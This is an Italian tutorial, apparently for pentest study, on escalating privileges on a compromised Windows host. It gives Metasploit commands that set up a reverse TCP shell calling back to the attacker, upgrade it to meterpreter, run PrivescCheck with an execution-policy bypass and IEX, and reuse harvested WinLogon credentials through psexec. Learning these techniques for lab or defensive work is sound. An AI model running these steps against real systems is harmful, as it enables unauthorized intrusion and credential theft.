
# Windows Privilege Escalation Vulnerabilities
Nel momento in cui abbiamo exploitato un servizio e quindi abbiamo ottenuto accesso ad un sistema, probabilmente ci ritroveremo con un utente con pochi privilegi e quindi avremo bisogno di elevare i nostri privilegi. <br>
Per poter elevare i prvilegi, ogni procedimento é diverso in base al sistema target, ma il concetto principale é quello di identificare delle vulnerabilitá interne che ci permettano di Procedere con questo passaggio. <br> 

Esiste un tool chiamato `PrivescCheck` su <a href="https://github.com/itm4n/PrivescCheck">GitHub</a> che permette di enumerare le piú comuni configurazioni deboli che possono permetterci di elevare i nostri privilegi. <br>
Per poter eseguire lo script, abbiamo bisogno di trasferirlo nel target per poi eseguirlo sul target stesso: 
```bash
use exploit/multi/script/web_delivery          # modulo per hostare un web server per trasferire un payload
set TARGET PSH\ (Binary)                       # impostiamo il target su powershell 
set payload windows/shell/reverse_tcp
set PSH-EncodedCommand false
set LHOST eth1
# verrà generato del codice PoweShell che dovremo copiare ed incollare in una shell sul sitema target windows
background
use post/multi/manage/shell_to_meterpreter
set LHOST eth1
set LPORT <DIFFPORT>
set SESSION 1
show adbanced
set WIN_TRANSFER VBS
run
# ottenendo una sessione meterpreter
```

ora che abbiamo ottenuto una sessione meterpreter sulla macchina, possiamo trasgerire la cartella del tool PrivescCheck sul target e spostarci al suo interno. <br> 
l'esecuzione del tool dipende dal tipo di shell che abbiamo ottenuto
```cmd
:: shell cmd
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```
```cmd
:: shell PowerShell
set-ExecutionPolicy Bypass -scope process -Force
. .\PrivescCheck.ps1; Invoke-PrivescCheck
```
```cmd
:: shell PowerShell senza modificare la Execution Policy
Get-Content .\PrivescCheck.ps1 | Out-String | IEX
Invoke-PrivescCheck
```
Otterremo cosí numerose informazioni sul sistema che potremmo sfruttare per elevare i nostri privilegi. <br> 
Se dovessimo trovare una vulnerabilitá nelle credenziali di WinLogon, essere verranno mostrate in chiaro e quindi possiamo usarle per poter elevare i nostri privilegi inserendole su PsExec e collegarci al sistema target via smb. 
```bash
use exploit/windows/smb/psexec
set USERNAME <user>
set PASSWORD <password>
run
```
